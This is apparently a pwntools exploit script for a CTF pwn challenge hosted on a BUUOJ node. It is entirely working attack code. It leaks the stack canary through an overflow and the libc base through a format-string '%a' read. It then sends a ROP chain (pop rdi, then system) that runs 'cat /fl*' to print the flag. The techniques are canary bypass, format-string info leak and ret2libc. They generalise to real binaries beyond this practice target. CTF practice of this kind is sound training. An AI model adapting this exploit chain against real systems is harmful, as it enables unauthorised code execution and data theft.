from pwn import  *
from LibcSearcher import LibcSearcher
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)
parser.add_argument('-b',help='binary file',required=True,metavar='BINARY')
parser.add_argument('-r',help='remote host',default='node3.buuoj.cn',metavar='RHOST')
parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')
parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')
parser.add_argument('-d',help='disable DEBUG mode',action='store_true')
args = parser.parse_args()
print(args)

binary = args.b
context.binary = binary
elf = ELF(binary,checksec=False)
if not args.d:
	context.log_level = 'DEBUG'

path_dict = {
	'23': '/lib/x86_64-linux-gnu/libc.so.6',
	'27': './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',
	'29': './glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'
}
libc_path = path_dict.get(args.l, args.l)
libc = ELF(libc_path,checksec=False)
if args.p:
	p = remote(args.r, args.p)
else:
	p = process(binary,env={'LD_PRELOAD':libc_path})

def dbg():
	gdb.attach(p)
	pause()

# start
def bored(payload,cont):
	sla('bored...\n', payload)
	sla('y/n\n',cont)

def stack(payload):
	sla('option:', 1)
	sa('once..\n',payload)

def fsb(payload):
	sla('option:', 3)
	sa('?)\n',payload)

def secret(payload):
	sla('option:',9011)
	sa('code:',payload)

sla('option:',2)
for i in range(4):
	bored('a','n')
bored('a','y')
stack('a'*0xa8 + 'a')
r(0xa9)
canary = u64('\x00' + r(7))
leak('canary', canary)

fsb('%a')
ru('0x0.0')
base = int(ru('p-'),16) - libc.sym['_IO_2_1_stdout_'] - 131
leak('base',base)
system = base + libc.sym['system']

pop_rdi = 0x400c53
payload = flat('cat /fl*',canary,'a'*8,pop_rdi,0x602080,system)
sla('option:',2)
bored(payload,'y')

try:
	for i in range(9999):
		secret('\x00')
except:
	p.close()
# end

p.interactive()